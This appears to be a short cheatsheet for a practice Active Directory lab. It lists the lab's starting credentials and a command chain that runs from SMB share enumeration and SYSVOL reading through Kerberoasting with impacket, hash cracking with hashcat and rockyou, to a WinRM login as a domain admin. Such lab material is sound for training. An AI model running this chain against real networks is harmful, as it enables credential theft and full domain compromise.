# Cheatsheet — First Domain

## Targets

- **dc01** — sole DC for corp.pentrain.local
- entry: `intern / Welcome2024!` (from the briefing) — plain Domain Users

## Useful commands

```bash
netexec smb <dc01> -u intern -p 'Welcome2024!' --shares
smbclient //<dc01>/SYSVOL -U 'corp\intern%Welcome2024!'  # scripts + notes
impacket-GetUserSPNs corp.pentrain.local/intern:'Welcome2024!' -dc-ip <dc01> -request
hashcat -m 13100 spns.txt rockyou.txt
evil-winrm -i <dc01> -u <roasted-user> -p '<cracked>'
```

## Concepts

- Any domain user may request service tickets — SPNs are the roast list
- SYSVOL on a DC is world-readable to domain users — scripts + notes live there
- Roast → crack → WinRM: the DA account's session opens the flag dirs
